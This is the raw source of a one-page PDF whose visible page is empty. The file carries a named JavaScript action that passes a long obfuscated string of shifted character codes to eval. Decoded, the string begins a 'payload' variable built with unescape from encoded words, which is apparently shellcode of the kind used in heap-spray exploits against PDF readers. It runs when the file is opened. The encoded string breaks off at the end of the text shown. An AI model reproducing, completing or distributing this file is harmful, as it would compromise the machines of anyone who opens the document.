%PDF-1.3
3 0 obj
<</Type /Page
/Parent 1 0 R
/Resources 2 0 R
/Contents 4 0 R>>
endobj
4 0 obj
<</Filter /FlateDecode /Length 25260>>
stream
endstream
endobj
1 0 obj
<</Type /Pages
/Kids [3 0 R ]
/Count 1
/MediaBox [0 0 300.00 400.00]
>>
endobj
5 0 obj
<</Type /Font
/BaseFont /Helvetica
/Subtype /Type1
/Encoding /WinAnsiEncoding
>>
endobj
2 0 obj
<<
/ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
/Font <<
/F1 5 0 R
>>
/XObject <<
>>
>>
endobj
6 0 obj
<<
/Names [(HtYfjPssa) 7 0 R ]
>>
endobj
7 0 obj
<<
/S /JavaScript
/JS (
var d = eval;
var s = "14 122 101 118 36 116 101 125 112 115 101 104 36 65 36 121 114 105 119 103 101 116 105 44 38 41 121 52 69 52 69 41 121 52 69 52 69 41 121 52 69 52 69 38 47 38 41 121 73 53 72 61 41 121 55 56 72 61 41 121 57 60 54 56 41 121 57 60 57 60 41 121 55 55 57 60 41 121 70 55 72 70 41 121 52 55 53 71 41 121 55 53 71 55 41 121 58 58 71 61 41 121 73 61 60 53 41 121 74 69 58 57 41 121 55 52 60 52 41 121 56 52 54 53 41 121 74 69 73 54 41 121 53 59 71 61 41 121 54 53 54 54 41 121 56 61 54 53 41 121 52 53 54 53 41 121 54 53 54 53 41 121 54 53 56 70 41 121 74 53 72 73 41 121 54 53 61 60 41 121 54 53 55 53 41 121 69 69 54 53 41 121 71 69 72 61 41 121 59 74 54 56 41 121 60 57 72 54 41 121 74 53 72 73 41 121 72 59 71 61 41 121 72 73 72 73 41 121 71 61 72 73 41 121 54 54 53 71 41 121 54 53 54 53 41 121 72 61 69 69 41 121 53 61 71 61 41 121 54 53 54 53 41 121 71 61 54 53 41 121 54 52 58 71 41 121 54 53 54 53 41 121 58 59 71 61 41 121 54 53 54 53 41 121 71 61 54 53 41 121 54 54 74 69 41 121 54 53 54 53 41 121 72 61 69 69 41 121 52 55 71 61 41 121 54 53 54 53 41 121 71 61 54 53 41 121 54 52 58 57 41 121 54 53 54 53 41 121 53 53 71 61 41 121 54 53 54 53 41 121 71 61 54 53 41 121 54 54 69 60 41 121 54 53 54 53 41 121 72 61 69 69 41 121 54 72 71 61 41 121 54 53 54 53 41 121 71 61 54 53 41 121 54 52 56 52 41 121 54 53 54 53 41 121 55 70 71 61 41 121 54 53 54 53 41 121 71 69 54 53 41 121 59 54 59 61 41 121 74 72 69 69 41 121 56 70 59 54 41 121 56 61 58 53 41 121 55 53 54 53 41 121 54 53 54 53 41 121 71 61 59 58 41 121 54 55 61 52 41 121 54 53 54 53 41 121 71 56 71 61 41 121 54 53 54 53 41 121 59 61 54 53 41 121 59 54 73 54 41 121 74 72 69 69 41 121 56 70 59 54 41 121 56 61 52 53 41 121 55 53 54 53 41 121 54 53 54 53 41 121 71 61 59 58 41 121 54 55 70 60 41 121 54 53 54 53 41 121 73 71 71 61 41 121 54 53 54 53 41 121 59 61 54 53 41 121 59 58 73 54 41 121 53 72 71 61 41 121 54 53 54 57 41 121 69 69 54 53 41 121 53 54 72 61 41 121 58 60 73 60 41 121 73 53 53 54 41 121 73 54 61 53 41 121 72 55 72 72 41 121 69 71 60 74 41 121 72 73 58 58 41 121 73 54 59 73 41 121 53 74 59 69 41 121 54 58 73 59 41 121 53 74 61 61 41 121 59 73 69 60 41 121 56 59 54 52 41 121 73 58 53 74 41 121 54 56 58 58 41 121 71 53 72 73 41 121 71 60 73 54 41 121 54 57 70 56 41 121 54 53 54 53 41 121 69 52 59 69 41 121 55 57 71 72 41 121 54 53 54 52 41 121 69 69 54 53 41 121 53 74 74 57 41 121 54 55 73 58 41 121 56 71 56 54 41 121 52 53 56 57 41 121 73 58 53 74 41 121 54 57 58 55 41 121 56 54 52 73 41 121 52 55 52 53 41 121 73 55 69 54 41 121 53 54 54 61 41 121 59 53 73 53 41 121 56 61 59 53 41 121 54 52 54 57 41 121 54 53 54 53 41 121 59 54 59 55 41 121 71 61 59 53 41 121 54 54 73 52 41 121 54 53 54 53 41 121 74 53 72 73 41 121 72 72 69 69 41 121 73 58 69 69 41 121 73 53 69 54 41 121 53 74 54 61 41 121 55 61 69 70 41 121 74 69 69 57 41 121 54 54 57 57 41 121 71 69 58 53 41 121 53 74 72 59 41 121 54 53 73 59 41 121 53 54 52 55 41 121 53 74 74 55 41 121 59 53 69 61 41 121 69 54 54 52 41 121 59 57 71 72 41 121 73 53 53 54 41 121 74 69 53 54 41 121 73 72 69 69 41 121 72 61 69 54 41 121 57 71 59 57 41 121 53 74 54 60 41 121 55 72 69 60 41 121 69 54 54 52 41 121 54 57 73 53 41 121 72 55 71 69 41 121 73 72 69 69 41 121 74 60 69 69 41 121 73 54 69 54 41 121 53 54 55 53 41 121 53 74 73 53 41 121 58 54 73 58 41 121 54 52 52 72 41 121 54 53 54 53 41 121 59 52 54 53 41 121 59 53 59 54 41 121 59 53 59 53 41 121 59 53 59 53 41 121 59 58 59 53 41 121 71 61 59 53 41 121 54 54 53 60 41 121 54 53 54 53 41 121 55 60 71 61 41 121 54 53 54 53 41 121 56 57 54 53 41 121 54 57 60 52 41 121 54 53 54 53 41 121 69 71 54 53 41 121 56 53 60 53 41 121 72 73 72 73 41 121 71 61 72 73 41 121 54 54 53 58 41 121 54 53 54 53 41 121 74 69 53 54 41 121 59 54 59 54 41 121 59 54 59 54 41 121 74 53 72 73 41 121 53 61 69 53 41 121 69 53 71 61 41 121 71 60 53 61 41 121 54 73 57 56 41 121 57 61 69 52 41 121 70 53 54 56 41 121 70 53 70 53 41 121 57 57 70 53 41 121 59 56 54 59 41 121 71 72 69 69 41 121 58 53 69 71 41 121 72 73 54 56 41 121 71 61 71 53 41 121 72 73 52 74 41 121 72 73 72 73 41 121 71 61 73 54 41 121 72 73 52 61 41 121 72 73 72 73 41 121 55 52 61 61 41 121 54 57 54 52 41 121 73 55 69 53 41 121 54 53 54 72 41 121 55 69 71 61 41 121 72 73 72 73 41 121 53 54 72 73 41 121 59 53 73 53 41 121 71 61 59 57 41 121 54 53 59 57 41 121 54 53 54 53 41 121 71 61 59 53 41 121 54 55 69 69 41 121 54 53 54 53 41 121 74 53 72 73 41 121 69 53 53 59 41 121 52 57 53 72 41 121 57 58 54 53 41 121 71 61 54 70 41 121 54 55 58 52 41 121 54 53 54 53 41 121 72 73 53 54 41 121 72 73 59 58 41 121 71 61 74 53 41 121 54 52 72 69 41 121 54 53 54 53 41 121 72 73 56 61 41 121 54 53 54 53 41 121 72 73 54 53 41 121 71 61 74 53 41 121 72 74 71 61 41 121 72 73 72 73 41 121 59 58 59 54 41 121 53 54 59 59 41 121 59 53 73 53 41 121 71 61 59 57 41 121 54 53 55 74 41 121 54 53 54 53 41 121 71 61 59 53 41 121 54 55 59 56 41 121 54 53 54 53 41 121 74 53 72 73 41 121 69 53 53 59 41 121 52 57 53 72 41 121 57 58 54 53 41 121 71 61 54 70 41 121 54 55 54 69 41 121 54 53 54 53 41 121 72 73 53 54 41 121 72 73 59 58 41 121 59 61 74 53 41 121 59 73 59 74 41 121 73 54 59 69 41 121 54 55 71 69 41 121 73 54 59 61 41 121 72 60 71 61 41 121 72 73 72 73 41 121 59 59 72 73 41 121 69 54 59 58 41 121 54 61 71 72 41 121 72 72 69 69 41 121 54 61 56 70 41 121 53 74 59 58 41 121 57 58 72 73 41 121 71 61 55 57 41 121 54 55 59 71 41 121 54 53 54 53 41 121 74 53 72 73 41 121 72 72 69 69 41 121 56 52 56 61 41 121 56 56 56 71 41 121 56 61 54 53 41 121 58 56 58 60 41 121 57 55 58 59 41 121 72 57 69 69 41 121 54 61 61 60 41 121 54 53 54 53 41 121 72 54 54 53 41 121 57 56 60 59 41 121 56 70 52 73 41 121 53 74 54 53 41 121 57 57 72 73 41 121 52 53 52 57 41 121 52 57 71 61 41 121 54 53 54 55 41 121 72 73 54 53 41 121 69 69 74 53 41 121 71 61 72 61 41 121 54 52 73 69 41 121 54 53 54 53 41 121 74 53 72 73 41 121 72 61 53 69 41 121 54 61 57 57 41 121 69 69 53 59 41 121 52 57 58 57 41 121 53 74 52 53 41 121 54 53 72 73 41 121 72 73 53 74 41 121 52 57 57 57 41 121 71 61 55 72 41 121 54 52 71 73 41 121 54 53 54 53 41 121 74 53 72 73 41 121 73 57 69 54 41 121 59 73 55 53 41 121 61 61 59 74 41 121 54 53 54 52 41 121 54 53 54 53 41 121 56 61 73 54 41 121 56 74 56 73 41 121 54 53 54 53 41 121 57 56 56 61 41 121 56 72 57 55 41 121 71 69 56 71 41 121 69 71 55 56 41 121 52 57 58 57 41 121 59 53 54 57 41 121 52 55 71 61 41 121 72 73 72 74 41 121 59 53 72 73 41 121 58 70 71 61 41 121 54 53 54 55 41 121 71 60 54 53 41 121 72 74 71 55 41 121 72 73 72 73 41 121 71 59 71 61 41 121 72 73 72 73 41 121 69 54 72 73 41 121 54 61 73 57 41 121 56 70 73 54 41 121 56 61 56 72 41 121 57 57 56 74 41 121 56 72 56 57 41 121 55 56 71 69 41 121 58 57 69 71 41 121 54 57 52 57 41 121 71 61 59 53 41 121 72 71 72 69 41 121 72 73 72 73 41 121 71 61 59 53 41 121 54 55 52 54 41 121 54 53 54 53 41 121 61 69 71 60 41 121 72 73 72 74 41 121 71 61 72 73 41 121 72 73 71 59 41 121 72 73 72 73 41 121 73 57 69 54 41 121 73 54 54 61 41 121 53 54 56 61 41 121 54 53 53 55 41 121 56 61 54 53 41 121 57 54 57 56 41 121 57 55 56 56 41 121 55 56 71 69 41 121 58 57 69 71 41 121 54 57 52 57 41 121 71 61 59 53 41 121 72 71 74 52 41 121 72 73 72 73 41 121 71 61 59 53 41 121 54 52 72 60 41 121 54 53 54 53 41 121 70 52 71 60 41 121 72 73 72 74 41 121 71 61 72 73 41 121 72 73 71 59 41 121 72 73 72 73 41 121 73 57 69 54 41 121 73 54 54 61 41 121 56 54 56 61 41 121 57 58 57 59 41 121 56 61 54 53 41 121 56 61 57 54 41 121 56 73 56 57 41 121 55 56 71 69 41 121 58 57 69 71 41 121 54 57 52 57 41 121 71 61 59 53 41 121 72 71 60 58 41 121 72 73 72 73 41 121 71 61 59 53 41 121 54 52 73 73 41 121 54 53 54 53 41 121 56 58 71 60 41 121 72 73 72 74 41 121 71 61 72 73 41 121 72 73 71 59 41 121 72 73 72 73 41 121 73 57 69 54 41 121 73 54 54 61 41 121 57 59 56 61 41 121 57 61 56 58 41 121 71 69 54 53 41 121 69 71 55 56 41 121 52 57 58 57 41 121 59 53 54 57 41 121 69 55 71 61 41 121 72 73 72 71 41 121 59 53 72 73 41 121 60 70 71 61 41 121 54 53 54 52 41 121 71 60 54 53 41 121 72 74 58 55 41 121 72 73 72 73 41 121 71 59 71 61 41 121 72 73 72 73 41 121 69 54 72 73 41 121 54 57 73 57 41 121 71 61 73 54 41 121 54 52 60 69 41 121 54 53 54 53 41 121 55 69 56 61 41 121 58 59 73 59 41 121 59 53 57 60 41 121 73 59 71 61 41 121 54 53 54 52 41 121 69 54 54 53 41 121 54 61 73 57 41 121 71 61 73 54 41 121 54 52 70 58 41 121 54 53 54 53 41 121 71 72 56 61 41 121 54 54 70 58 41 121 59 53 54 72 41 121 61 55 71 61 41 121 54 53 54 52 41 121 69 54 54 53 41 121 54 61 73 57 41 121 71 61 73 54 41 121 54 52 69 54 41 121 54 53 54 53 41 121 60 70 56 61 41 121 54 71 72 72 41 121 59 53 57 72 41 121 70 74 71 61 41 121 54 53 54 52 41 121 69 54 54 53 41 121 54 61 73 57 41 121 71 61 73 54 41 121 54 52 56 73 41 121 54 53 54 53 41 121 71 71 56 61 41 121 71 73 59 59 41 121 59 53 53 59 41 121 69 70 71 61 41 121 54 53 54 52 41 121 69 54 54 53 41 121 54 61 73 57 41 121 71 61 73 54 41 121 54 52 59 69 41 121 54 53 54 53 41 121 72 53 56 61 41 121 54 57 69 70 41 121 59 53 59 73 41 121 57 59 71 61 41 121 54 53 54 52 41 121 69 54 54 53 41 121 54 61 73 57 41 121 71 61 73 54 41 121 72 74 72 58 41 121 72 73 72 73 41 121 57 61 56 61 41 121 74 69 56 61 41 121 59 53 55 72 41 121 56 55 71 61 41 121 54 53 54 52 41 121 69 54 54 53 41 121 54 61 73 57 41 121 71 61 73 54 41 121 54 52 53 54 41 121 54 53 54 53 41 121 71 73 56 61 41 121 71 53 73 74 41 121 59 53 56 53 41 121 58 74 71 61 41 121 54 53 54 52 41 121 69 54 54 53 41 121 54 61 73 57 41 121 71 61 73 54 41 121 54 52 55 73 41 121 54 53 54 53 41 121 61 53 56 61 41 121 52 71 58 60 41 121 59 53 74 69 41 121 53 70 71 61 41 121 54 53 54 52 41 121 69 54 54 53 41 121 54 61 73 57 41 121 71 61 73 54 41 121 72 73 53 59 41 121 72 73 72 73 41 121 60 69 56 61 41 121 70 69 59 74 41 121 59 53 55 74 41 121 52 59 71 61 41 121 54 53 54 52 41 121 69 54 54 53 41 121 54 61 73 57 41 121 71 61 73 54 41 121 72 74 60 58 41 121 72 73 72 73 41 121 59 60 56 61 41 121 69 52 70 58 41 121 59 53 54 55 41 121 55 55 71 61 41 121 54 53 54 52 41 121 69 54 54 53 41 121 54 61 73 57 41 121 71 61 73 54 41 121 54 53 71 54 41 121 54 53 54 53 41 121 57 74 56 61 41 121 71 55 74 61 41 121 59 53 57 54 41 121 72 74 71 61 41 121 54 53 54 53 41 121 69 54 54 53 41 121 54 61 73 57 41 121 71 61 73 54 41 121 54 53 73 73 41 121 54 53 54 53 41 121 70 74 56 61 41 121 61 69 72 60 41 121 59 53 53 56 41 121 71 70 71 61 41 121 54 53 54 53 41 121 69 54 54 53 41 121 54 61 73 57 41 121 71 61 73 54 41 121 72 74 70 55 41 121 72 73 72 73 41 121 59 58 56 61 41 121 61 56 60 53 41 121 59 53 61 69 41 121 74 59 71 61 41 121 54 53 54 53 41 121 69 54 54 53 41 121 54 61 73 57 41 121 71 61 73 54 41 121 72 74 57 74 41 121 72 73 72 73 41 121 55 70 56 61 41 121 55 74 57 70 41 121 59 53 54 55 41 121 73 55 71 61 41 121 54 53 54 53 41 121 69 54 54 53 41 121 54 61 73 57 41 121 71 61 73 54 41 121 72 74 56 70 41 121 72 73 72 73 41 121 71 53 56 61 41 121 53 53 59 69 41 121 59 53 70 57 41 121 60 74 71 61 41 121 54 53 54 53 41 121 69 54 54 53 41 121 54 61 73 57 41 121 71 61 73 54 41 121 72 74 59 59 41 121 72 73 72 73 41 121 70 58 56 61 41 121 71 55 73 60 41 121 59 53 60 54 41 121 70 70 71 61 41 121 54 53 54 53 41 121 69 54 54 53 41 121 54 61 73 57 41 121 71 61 73 54 41 121 72 74 58 55 41 121 72 73 72 73 41 121 56 61 56 61 41 121 73 56 52 57 41 121 59 53 61 54 41 121 69 59 71 61 41 121 54 53 54 53 41 121 69 54 54 53 41 121 54 61 73 57 41 121 71 61 73 54 41 121 54 53 59 58 41 121 54 53 54 53 41 121 57 55 56 61 41 121 61 54 72 74 41 121 59 53 55 59 41 121 57 55 71 61 41 121 54 53 54 53 41 121 69 54 54 53 41 121 54 61 73 57 41 121 71 61 73 54 41 121 72 74 58 57 41 121 72 73 72 73 41 121 55 54 71 69 41 121 56 56 56 70 41 121 71 61 59 53 41 121 72 69 72 58 41 121 72 73 72 73 41 121 71 61 59 53 41 121 72 74 60 69 41 121 72 73 72 73 41 121 61 58 71 60 41 121 72 73 72 72 41 121 71 61 72 73 41 121 72 73 71 61 41 121 72 73 72 73 41 121 71 61 73 54 41 121 72 71 60 60 41 121 72 73 72 73 41 121 58 73 56 61 41 121 58 73 71 73 41 121 59 53 54 56 41 121 53 74 71 61 41 121 54 53 54 53 41 121 69 54 54 53 41 121 54 61 73 57 41 121 71 61 73 54 41 121 54 53 54 73 41 121 54 53 54 53 41 121 69 74 56 61 41 121 54 74 58 74 41 121 59 53 71 72 41 121 52 70 71 61 41 121 54 53 54 53 41 121 69 54 54 53 41 121 54 61 73 57 41 121 53 54 73 54 41 121 56 57 73 53 41 121 58 53 69 69 41 121 69 56 53 53 41 121 57 61 73 53 41 121 53 74 55 53 41 121 58 53 69 69 41 121 53 74 54 72 41 121 57 53 69 69 41 121 60 71 55 72 41 121 69 69 53 74 41 121 54 61 58 53 41 121 71 69 73 54 41 121 53 74 54 69 41 121 58 53 69 69 41 121 69 54 53 57 41 121 57 72 73 53 41 121 69 69 53 74 41 121 53 72 58 53 41 121 56 53 73 54 41 121 69 69 53 59 41 121 52 57 56 72 41 121 53 59 52 57 41 121 58 56 69 69 41 121 53 59 53 72 41 121 59 57 69 69 41 121 57 61 54 56 41 121 74 56 54 54 41 121 69 69 53 74 41 121 55 61 58 70 41 121 69 69 53 74 41 121 52 53 59 70 41 121 74 71 54 54 41 121 53 69 71 54 41 121 53 74 58 60 41 121 53 57 69 6